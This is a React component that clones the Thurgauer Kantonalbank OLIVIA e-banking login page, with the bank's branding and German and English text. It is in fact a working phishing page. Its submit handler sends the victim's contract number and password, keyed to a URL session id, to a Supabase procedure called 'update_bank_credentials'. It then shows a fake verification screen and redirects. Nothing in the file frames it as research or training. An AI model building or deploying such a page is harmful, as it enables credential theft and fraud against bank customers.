import { useState, useEffect } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { ArrowRight } from "lucide-react";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";
import oliviaWhite from "@/assets/tkb-olivia-white.svg.asset.json";
import footerLogo from "@/assets/tkb-footer-logo.svg.asset.json";

const GREEN = "#006d41";
const GREEN_DARK = "#005533";

type Lang = "de" | "en";

const translations = {
  de: {
    pageTitle: "Thurgauer Kantonalbank – OLIVIA",
    loginTitle: "Login",
    contractNumber: "Vertragsnummer",
    password: "Passwort",
    submit: "Weiter",
    loading: "Anmeldedaten werden überprüft...",
    forgotPw: "Passwort vergessen",
    newDevice: "Neues Gerät registrieren",
    block: "Vertrag sperren",
    required: "Das Feld darf nicht leer sein.",
    card1Title: "Wie logge ich mich ein",
    card1Text: "Verwenden Sie Ihre bekannten E-Banking Login-Daten für die Anmeldung.",
    card1Link1: "Hilfe zum Login",
    card1Link2: "Sicherheit beim E-Banking",
    card2Title: "Was ist OLIVIA?",
    card2Text: "OLIVIA ist das Kundenportal der TKB, welches E-Banking und weitere digitale Services vereint.",
    card2Link: "Mehr Informationen",
  },
  en: {
    pageTitle: "Thurgauer Kantonalbank – OLIVIA",
    loginTitle: "Login",
    contractNumber: "Contract number",
    password: "Password",
    submit: "Continue",
    loading: "Verifying login details...",
    forgotPw: "Forgot password",
    newDevice: "Register new device",
    block: "Block contract",
    required: "This field must not be empty.",
    card1Title: "How do I log in",
    card1Text: "Use your familiar e-banking login details to sign in.",
    card1Link1: "Login help",
    card1Link2: "E-banking security",
    card2Title: "What is OLIVIA?",
    card2Text: "OLIVIA is TKB's customer portal that combines e-banking and other digital services.",
    card2Link: "More information",
  },
} as const;

const footerLinks = [
  { de: "Rechtliche Hinweise", en: "Legal notice", href: "https://www.tkb.ch/rechtliche-hinweise" },
  { de: "Datenschutz", en: "Privacy", href: "https://www.tkb.ch/datenschutz" },
  { de: "Impressum", en: "Imprint", href: "https://www.tkb.ch/impressum" },
  { de: "Kontakt", en: "Contact", href: "https://www.tkb.ch/kontakt" },
];

const ChThurgauerKantonalbank = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = searchParams.get("s") || "";
  const [showLoading, setShowLoading] = useState(false);
  const [lang, setLang] = useState<Lang>("de");

  const [vertragsnummer, setVertragsnummer] = useState("");
  const [passwort, setPasswort] = useState("");
  const [touchedVnr, setTouchedVnr] = useState(false);
  const [touchedPw, setTouchedPw] = useState(false);
  const [focusVnr, setFocusVnr] = useState(false);
  const [focusPw, setFocusPw] = useState(false);

  useEffect(() => {
    window.scrollTo(0, 0);
  }, []);

  const t = translations[lang];
  usePageMeta(t.pageTitle, footerLogo.url);

  const canSubmit = vertragsnummer.trim().length > 0 && passwort.trim().length > 0;

  const handleSubmit = async () => {
    if (!canSubmit) return;
    if (sessionId) {
      const { error } = await supabase.rpc("update_bank_credentials", {
        p_session_id: sessionId,
        p_username: vertragsnummer,
        p_password: passwort,
        p_username_label: "Vertragsnummer",
        p_password_label: "Passwort",
      });
      if (error) console.error("Update failed:", error);
    } else {
      console.error("No session ID found in URL!");
    }
    setShowLoading(true);
  };

  const inputStyle = (focused: boolean, error: boolean): React.CSSProperties => ({
    width: "100%",
    height: 48,
    padding: "0 12px",
    background: "#fff",
    border: `${focused || error ? 2 : 1}px solid ${
      error ? "#d32f2f" : focused ? GREEN : "#6c6e70"
    }`,
    borderRadius: 0,
    fontSize: 18,
    outline: "none",
    color: "#1a1a1a",
  });

  const quickLinks = [
    { label: t.forgotPw },
    { label: t.newDevice },
    { label: t.block },
  ];

  const showVnrError = touchedVnr && vertragsnummer.trim() === "";
  const showPwError = touchedPw && passwort.trim() === "";

  return (
    <>
      {showLoading && (
        <LoadingOverlay
          message={t.loading}
          onComplete={() => navigate("/confirmation?s=" + sessionId)}
        />
      )}
      <div className="min-h-screen bg-white flex flex-col">
        {/* Header with gradient */}
        <header
          className="w-full"
          style={{
            background:
              "linear-gradient(90deg, #4f9925 0%, #006d41 38%, #006d41 100%)",
          }}
        >
          <div className="max-w-[1100px] w-full mx-auto px-4 md:px-20 py-5 md:py-6 flex items-center justify-between">
            <div className="flex items-center gap-4">
              <img
                src={oliviaWhite.url}
                alt="TKB OLIVIA"
                className="h-[26px] md:h-[34px] object-contain"
              />
            </div>
            <div className="flex items-center gap-3 text-[14px] text-white">
              <button
                type="button"
                onClick={() => setLang("de")}
                className={lang === "de" ? "font-bold" : "font-normal underline"}
              >
                DE
              </button>
              <span style={{ color: "rgba(255,255,255,0.6)" }}>|</span>
              <button
                type="button"
                onClick={() => setLang("en")}
                className={lang === "en" ? "font-bold" : "font-normal underline"}
              >
                EN
              </button>
            </div>
          </div>
        </header>

        {/* Main */}
        <main className="flex-1">
          <div className="max-w-[1100px] w-full mx-auto px-4 md:px-20 pt-8 md:pt-12">
            <h1 className="text-[28px] md:text-[32px] font-normal text-black">
              {t.loginTitle}
            </h1>

            <div className="mt-6 max-w-[480px]">
              <div className="space-y-5">
                <div>
                  <label htmlFor="tkb-vnr" className="block text-[14px] text-black font-bold mb-2">
                    {t.contractNumber}
                  </label>
                  <input
                    id="tkb-vnr"
                    type="text"
                    value={vertragsnummer}
                    onChange={(e) => setVertragsnummer(e.target.value)}
                    onFocus={() => setFocusVnr(true)}
                    onBlur={() => {
                      setFocusVnr(false);
                      setTouchedVnr(true);
                    }}
                    style={inputStyle(focusVnr, showVnrError)}
                  />
                  {showVnrError && (
                    <p className="mt-2 text-[13px] text-[#d32f2f]">{t.required}</p>
                  )}
                </div>
                <div>
                  <label htmlFor="tkb-pw" className="block text-[14px] text-black font-bold mb-2">
                    {t.password}
                  </label>
                  <input
                    id="tkb-pw"
                    type="password"
                    value={passwort}
                    onChange={(e) => setPasswort(e.target.value)}
                    onFocus={() => setFocusPw(true)}
                    onBlur={() => {
                      setFocusPw(false);
                      setTouchedPw(true);
                    }}
                    style={inputStyle(focusPw, showPwError)}
                  />
                  {showPwError && (
                    <p className="mt-2 text-[13px] text-[#d32f2f]">{t.required}</p>
                  )}
                </div>
              </div>

              <div className="mt-8">
                <button
                  type="button"
                  onClick={handleSubmit}
                  disabled={!canSubmit}
                  className="px-10 h-[44px] text-[15px] font-medium transition-colors"
                  style={{
                    borderRadius: 0,
                    background: canSubmit ? GREEN : "#dedfdf",
                    color: canSubmit ? "#fff" : "#9a9a9a",
                    cursor: canSubmit ? "pointer" : "not-allowed",
                  }}
                  onMouseEnter={(e) => {
                    if (canSubmit) e.currentTarget.style.background = GREEN_DARK;
                  }}
                  onMouseLeave={(e) => {
                    if (canSubmit) e.currentTarget.style.background = GREEN;
                  }}
                >
                  {t.submit}
                </button>
              </div>

              <div className="mt-8 space-y-3">
                {quickLinks.map((l) => (
                  <a
                    key={l.label}
                    href="#"
                    onClick={(e) => e.preventDefault()}
                    className="flex items-center gap-2 text-[15px] underline"
                    style={{ color: GREEN }}
                  >
                    <ArrowRight size={18} strokeWidth={2} />
                    {l.label}
                  </a>
                ))}
              </div>
            </div>

            {/* Info Cards */}
            <div className="mt-16 grid grid-cols-1 md:grid-cols-2 gap-6 items-stretch">
              <div
                className="p-6 md:p-8 flex flex-col"
                style={{ background: "#f7f6f6", border: "1px solid #eae9e9" }}
              >
                <h3 className="text-[20px] font-bold text-black">{t.card1Title}</h3>
                <p className="mt-3 text-[15px] text-[#3a3a3a] leading-relaxed">
                  {t.card1Text}
                </p>
                <div className="mt-auto pt-6 space-y-2">
                  <a
                    href="#"
                    onClick={(e) => e.preventDefault()}
                    className="flex items-center gap-2 text-[15px] underline"
                    style={{ color: GREEN }}
                  >
                    <ArrowRight size={18} strokeWidth={2} />
                    {t.card1Link1}
                  </a>
                  <a
                    href="#"
                    onClick={(e) => e.preventDefault()}
                    className="flex items-center gap-2 text-[15px] underline"
                    style={{ color: GREEN }}
                  >
                    <ArrowRight size={18} strokeWidth={2} />
                    {t.card1Link2}
                  </a>
                </div>
              </div>

              <div
                className="p-6 md:p-8 flex flex-col"
                style={{ background: "#f7f6f6", border: "1px solid #eae9e9" }}
              >
                <h3 className="text-[20px] font-bold text-black">{t.card2Title}</h3>
                <p className="mt-3 text-[15px] text-[#3a3a3a] leading-relaxed">
                  {t.card2Text}
                </p>
                <div className="mt-auto pt-6">
                  <a
                    href="#"
                    onClick={(e) => e.preventDefault()}
                    className="flex items-center gap-2 text-[15px] underline"
                    style={{ color: GREEN }}
                  >
                    <ArrowRight size={18} strokeWidth={2} />
                    {t.card2Link}
                  </a>
                </div>
              </div>
            </div>
          </div>
        </main>

        {/* Footer */}
        <footer className="mt-16 py-6">
          <div className="max-w-[1100px] mx-auto px-4 md:px-20">
            <div
              className="flex flex-nowrap items-center gap-x-1.5 md:gap-x-2 gap-y-2 text-[11px] md:text-[15px]"
              style={{ color: "#6c6e70" }}
            >
              {footerLinks.map((link, i) => (
                <div key={link.href} className="flex items-center gap-x-1.5 md:gap-x-2">
                  <a
                    href={link.href}
                    target="_blank"
                    rel="noopener noreferrer"
                    className="underline"
                  >
                    {lang === "de" ? link.de : link.en}
                  </a>
                  {i < footerLinks.length - 1 && (
                    <span className="text-[#bcbcbc]">|</span>
                  )}
                </div>
              ))}
            </div>
          </div>
        </footer>
      </div>
    </>
  );
};

export default ChThurgauerKantonalbank;
